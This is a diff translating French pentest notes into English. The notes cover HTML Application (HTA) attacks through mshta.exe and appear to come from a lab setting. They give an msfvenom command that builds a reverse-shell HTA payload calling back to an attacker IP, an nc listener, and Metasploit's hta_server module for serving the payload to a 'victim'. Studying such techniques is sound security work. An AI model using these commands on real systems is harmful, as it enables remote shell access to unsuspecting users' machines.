@@ -1,10 +1,10 @@
 # An HTML Application - HTA
 
-An HTML Application - HTA  qui sont  des pages `HTML dynamiques` contenant JScript et VBScript. 
+An HTML Application - HTA which are `dynamic HTML` pages containing JScript and VBScript.
 
-L'outil `mshta.exe` LOLBINS (Living-of-the-land Binaries) est utilisé pour exécuter les fichiers HTA . Il peut être exécuté seul ou automatiquement depuis Internet Explorer.
+The `mshta.exe` LOLBINS (Living-of-the-land Binaries) tool is used to execute HTA files. It can be executed alone or automatically from Internet Explorer.
 
-Soit le fichier `index.hta` notre charge utile pour exécuter `cmd.exe`
+Let `index.hta` be our payload to execute `cmd.exe`
 
 ```html
 <html>
@@ -24,7 +24,7 @@ Soit le fichier `index.hta` notre charge utile pour exécuter `cmd.exe`
 
 ## HTA Reverse Connection
 
-Nous pouvons créer une charge utile de shell inversé avec `msfvenom`. Une fois que la victime visite l’URL malveillante et clique sur Exécuter, nous récupérons la connexion.
+We can create a reverse shell payload with `msfvenom`. Once the victim visits the malicious URL and clicks Run, we get the connection.
 
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o payload.hta
@@ -40,5 +40,4 @@ nc -nlvp 443
 use exploit/windows/misc/hta_server
 ```
 
-Sur la machine victime, une fois que nous visitons le fichier HTA malveillant fourni comme URL par Metasploit , nous devrions recevoir une connexion inversée.
-
+On the victim machine, once we visit the malicious HTA file provided as a URL by Metasploit, we should receive a reverse connection.
